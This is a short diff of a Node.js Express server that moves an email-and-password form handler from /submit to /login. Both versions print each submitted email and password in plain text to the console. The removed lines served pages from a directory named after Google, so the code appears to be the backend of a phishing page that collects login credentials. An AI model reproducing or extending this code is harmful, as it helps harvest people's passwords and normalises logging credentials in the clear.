@@ -1,28 +1,21 @@
 const express = require('express');
-const cors = require('cors');
 const bodyParser = require('body-parser');
-const path = require('path');
+const cors = require('cors');
 
 const app = express();
-const PORT = 3000;
+const port = 3000;
 
-app.use(cors());
+// Middleware
+app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
-app.use(express.json());
+app.use(cors());
 
-// Serve the static files from the root directory (google7070)
-app.use(express.static(path.join(__dirname, '../')));
-
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, '../index.html'));
-});
-
-app.post('/submit', (req, res) => {
+app.post('/login', (req, res) => {
     const { email, password } = req.body;
     console.log(`Email: ${email}, Password: ${password}`);
-    res.send('Dados recebidos com sucesso!');
+    res.send('Login data received');
 });
 
-app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
+app.listen(port, () => {
+    console.log(`Server running on port ${port}`);
 });
